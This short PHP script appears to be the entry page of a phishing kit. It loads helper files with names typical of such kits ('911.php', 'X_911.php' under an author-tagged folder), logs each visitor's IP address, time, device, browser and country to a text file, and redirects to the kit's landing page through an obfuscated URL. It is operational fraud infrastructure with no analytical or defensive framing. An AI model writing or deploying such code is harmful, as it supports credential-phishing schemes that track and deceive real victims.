<?php

include('./MTTRBDFH/AlexRony/911.php');
include('./MTTRBDFH/AlexRony/COUNTRY.php');
include('./MTTRBDFH/AlexRony/SYS.php');
include('./MTTRBDFH/X_911.php');

	$file = fopen("911.txt","a");
	fwrite($file,"IP=".$ip."/TIME=".$date."/DEVICE=".$user_os."/BROWSER=".$user_browser." >> [$get_user_country]\n");
header("Location: ./MTTRBDFH/index.php?FGDD=1#HDHKJDJDSSJDSJKJDSJDSDJJDSHYKJHGFG");
?>